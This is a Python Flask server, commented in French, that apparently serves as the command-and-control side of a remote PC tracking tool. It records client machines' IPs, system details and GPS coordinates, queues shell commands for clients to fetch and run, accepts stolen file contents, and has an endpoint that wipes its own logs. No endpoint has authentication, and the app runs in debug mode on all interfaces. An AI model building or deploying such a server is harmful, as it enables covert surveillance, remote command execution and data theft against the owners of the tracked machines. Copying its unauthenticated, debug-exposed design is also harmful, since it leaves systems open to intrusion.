#!/usr/bin/env python
from flask import Flask, request, jsonify, render_template
import sqlite3, logging, os, json, datetime, traceback

app = Flask(__name__)

@app.template_filter('fromjson')
def fromjson_filter(s):
    try:
        return json.loads(s)
    except Exception:
        return {}

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_FILE = os.path.join(BASE_DIR, "tracking.db")
LOG_FILE = os.path.join(BASE_DIR, "server.log")

# Configuration du logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def init_db():
    """Crée les tables si elles n'existent pas."""
    try:
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            # Table principale
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS tracked_pcs (
                    computer_name TEXT PRIMARY KEY,
                    ip TEXT,
                    system_info TEXT
                )
            """)
            # Historique
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS historical_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    computer_name TEXT,
                    timestamp DATETIME,
                    system_info TEXT
                )
            """)
            # Commandes
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS commands (
                    computer_name TEXT PRIMARY KEY,
                    command TEXT
                )
            """)
            # Fichiers uploadés
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS files (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    computer_name TEXT,
                    file_path TEXT,
                    file_content TEXT,
                    timestamp DATETIME
                )
            """)
            conn.commit()
        logging.info("Base de données initialisée.")
    except Exception as e:
        logging.exception("Erreur lors de l'initialisation de la DB: %s", e)



def upgrade_db():
    """Vérifie et ajoute les colonnes manquantes dans tracked_pcs."""
    try:
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("PRAGMA table_info(tracked_pcs)")
            columns = [info[1] for info in cursor.fetchall()]
            # Liste des colonnes attendues
            expected_columns = {
                "last_update": "DATETIME",
                "latitude": "TEXT",
                "longitude": "TEXT"
            }
            for col, col_type in expected_columns.items():
                if col not in columns:
                    try:
                        cursor.execute(f"ALTER TABLE tracked_pcs ADD COLUMN {col} {col_type}")
                        logging.info("Colonne ajoutée: %s", col)
                    except Exception as alter_e:
                        logging.exception("Erreur lors de l'ajout de la colonne %s: %s", col, alter_e)
            conn.commit()
    except Exception as e:
        logging.exception("Erreur lors de l'upgrade de la DB: %s", e)

# Initialisation et upgrade de la DB
init_db()
upgrade_db()

@app.route("/tracked_pcs", methods=["GET"])
def get_tracked_pcs():
    """Retourne la liste des PCs suivis avec leurs infos et coordonnées."""
    try:
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            query = "SELECT computer_name, ip, system_info, last_update, latitude, longitude FROM tracked_pcs"
            logging.debug("Exécution de la requête: %s", query)
            cursor.execute(query)
            pcs = {}
            for row in cursor.fetchall():
                try:
                    sys_info = json.loads(row[2]) if row[2] else {}
                except Exception as parse_e:
                    logging.error("Erreur parsing system_info pour %s: %s", row[0], parse_e)
                    sys_info = {}
                pcs[row[0]] = {
                    "ip": row[1],
                    "system_info": sys_info,
                    "last_update": row[3],
                    "latitude": row[4],
                    "longitude": row[5]
                }
        return jsonify(pcs), 200
    except Exception as e:
        logging.exception("Erreur lors de get_tracked_pcs: %s", e)
        return jsonify({"status": "error", "message": "Erreur serveur"}), 500

@app.route("/localisation", methods=["POST"])
def receive_location():
    """Reçoit et enregistre la localisation et les infos système d'un client."""
    try:
        data = request.get_json(silent=True)
        if data is None:
            data = request.form.to_dict()
        logging.debug("Données reçues dans /localisation: %s", data)
        
        pc_name = data.get("computer_name")
        ip = data.get("ip")
        system_info = data.get("system_info", "")
        if not pc_name or not ip:
            logging.error("Données invalides reçues: pc_name=%s, ip=%s", pc_name, ip)
            return jsonify({"status": "error", "message": "Données invalides"}), 400

        # Récupération des infos système (optionnel, selon ce que l'on souhaite faire)
        try:
            parsed_info = json.loads(system_info)
        except Exception as parse_err:
            logging.error("Erreur de parsing system_info: %s", parse_err)
            parsed_info = {}

        # Traitement du champ gps envoyé séparément
        gps_str = data.get("gps", "{}")
        try:
            gps_data = json.loads(gps_str)
        except Exception as parse_err:
            logging.error("Erreur de parsing du champ gps: %s", parse_err)
            gps_data = {}
        gps_lat = gps_data.get("latitude")
        gps_lon = gps_data.get("longitude")

        now = datetime.datetime.utcnow().isoformat() + "Z"

        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            try:
                cursor.execute("""
                    REPLACE INTO tracked_pcs (computer_name, ip, system_info, last_update, latitude, longitude)
                    VALUES (?, ?, ?, ?, ?, ?)
                """, (pc_name, ip, system_info, now, gps_lat, gps_lon))
            except sqlite3.OperationalError as op_err:
                logging.error("Erreur SQL (REPLACE tracked_pcs): %s", op_err)
                raise
            try:
                cursor.execute("""
                    INSERT INTO historical_logs (computer_name, timestamp, system_info)
                    VALUES (?, ?, ?)
                """, (pc_name, now, system_info))
            except sqlite3.OperationalError as op_err2:
                logging.error("Erreur SQL (INSERT historical_logs): %s", op_err2)
                raise
            conn.commit()
        logging.info("Localisation mise à jour pour %s (IP: %s)", pc_name, ip)
        return jsonify({"status": "success", "message": "Infos enregistrées"}), 200
    except Exception as e:
        logging.exception("Erreur dans /localisation: %s", e)
        return jsonify({"status": "error", "message": "Erreur serveur"}), 500


@app.route("/set_command", methods=["POST"])
def set_command():
    """Enregistre une commande pour un PC donné."""
    try:
        data = request.get_json(silent=True)
        if data is None:
            data = request.form.to_dict()
        logging.debug("Données reçues dans /set_command: %s", data)
        pc_name = data.get("computer_name")
        command = data.get("command")
        if not pc_name or not command:
            logging.error("Données invalides pour set_command: pc_name=%s, command=%s", pc_name, command)
            return jsonify({"status": "error", "message": "Données invalides"}), 400

        if isinstance(command, dict):
            cmd_to_store = json.dumps(command)
        else:
            cmd_to_store = json.dumps({"type": "shell", "value": command})

        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("REPLACE INTO commands (computer_name, command) VALUES (?, ?)", (pc_name, cmd_to_store))
            conn.commit()
        logging.info("Commande enregistrée pour %s: %s", pc_name, cmd_to_store)
        return jsonify({"status": "success", "message": "Commande enregistrée"}), 200
    except Exception as e:
        logging.exception("Erreur dans /set_command: %s", e)
        return jsonify({"status": "error", "message": "Erreur serveur"}), 500

@app.route("/commande", methods=["GET"])
def send_command():
    """Envoie la commande en attente pour un PC puis la supprime."""
    try:
        pc_name = request.args.get("computer_name")
        if not pc_name:
            logging.error("Aucun computer_name fourni dans /commande")
            return jsonify({"command": None}), 200
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT command FROM commands WHERE computer_name = ?", (pc_name,))
            row = cursor.fetchone()
            if row and row[0]:
                command = json.loads(row[0])
                cursor.execute("DELETE FROM commands WHERE computer_name = ?", (pc_name,))
                conn.commit()
                logging.info("Commande envoyée à %s: %s", pc_name, command)
                return jsonify({"command": command}), 200
        return jsonify({"command": None}), 200
    except Exception as e:
        logging.exception("Erreur dans /commande: %s", e)
        return jsonify({"status": "error", "message": "Erreur serveur"}), 500

@app.route("/upload_file", methods=["POST"])
def upload_file_endpoint():
    """Enregistre le contenu d'un fichier envoyé par le client."""
    try:
        data = request.get_json(silent=True)
        if data is None:
            data = request.form.to_dict()
        logging.debug("Données reçues dans /upload_file: %s", data)
        computer_name = data.get("computer_name")
        file_path = data.get("file_path")
        file_content = data.get("file_content")
        if not computer_name or not file_path or file_content is None:
            logging.error("Données invalides pour /upload_file: %s", data)
            return jsonify({"status": "error", "message": "Données invalides"}), 400
        now = datetime.datetime.utcnow().isoformat()
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO files (computer_name, file_path, file_content, timestamp)
                VALUES (?, ?, ?, ?)
            """, (computer_name, file_path, file_content, now))
            conn.commit()
        logging.info("Fichier uploadé depuis %s: %s", computer_name, file_path)
        return jsonify({"status": "success", "message": "Fichier uploadé"}), 200
    except Exception as e:
        logging.exception("Erreur dans /upload_file: %s", e)
        return jsonify({"status": "error", "message": "Erreur serveur"}), 500

@app.route("/historical/<computer_name>", methods=["GET"])
def get_historical(computer_name):
    """Retourne l'historique des mises à jour pour un PC."""
    try:
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT timestamp, system_info FROM historical_logs 
                WHERE computer_name = ? ORDER BY timestamp ASC
            """, (computer_name,))
            records = cursor.fetchall()
            history = []
            for ts, sys_info in records:
                try:
                    info = json.loads(sys_info)
                except Exception as parse_err:
                    logging.error("Erreur de parsing historique pour %s: %s", computer_name, parse_err)
                    info = {}
                history.append({"timestamp": ts, "system_info": info})
        return jsonify(history), 200
    except Exception as e:
        logging.exception("Erreur dans /historical/%s: %s", computer_name, e)
        return jsonify({"status": "error", "message": "Erreur serveur"}), 500

@app.route("/clear_logs", methods=["POST"])
def clear_logs():
    """Vide le fichier de logs du serveur."""
    try:
        open(LOG_FILE, "w").close()
        logging.info("Logs vidés")
        return jsonify({"status": "success", "message": "Logs vidés"})
    except Exception as e:
        logging.exception("Erreur lors du vidage des logs: %s", e)
        return jsonify({"status": "error", "message": "Erreur serveur"}), 500


@app.route("/test_template")
def test_template():
    try:
        return render_template("index.html")
    except Exception as e:
        logging.exception("Erreur dans /test_template: %s", e)
        return f"<h1>Erreur lors du rendu de test_template</h1><pre>{traceback.format_exc()}</pre>", 500


@app.route("/")
def index():
    """Affiche l'interface web principale."""
    try:
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            query = "SELECT computer_name, ip, system_info, last_update, latitude, longitude FROM tracked_pcs"
            logging.debug("Exécution de la requête pour index: %s", query)
            cursor.execute(query)
            pcs = cursor.fetchall()
        logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r", encoding="utf-8", errors="replace") as f:
                logs = f.readlines()
        return render_template("index.html", pcs=pcs, logs=logs)
    except Exception as e:
        logging.exception("Erreur lors du rendu de l'interface (index): %s", e)
        import traceback
        return f"<h1>Erreur serveur</h1><pre>{traceback.format_exc()}</pre>", 500



@app.errorhandler(404)
def page_not_found(e):
    """Gestion des erreurs 404."""
    return jsonify({"status": "error", "message": "Route non trouvée"}), 404

if __name__ == "__main__":
    logging.info("Serveur Flask démarré sur http://0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000, debug=True)
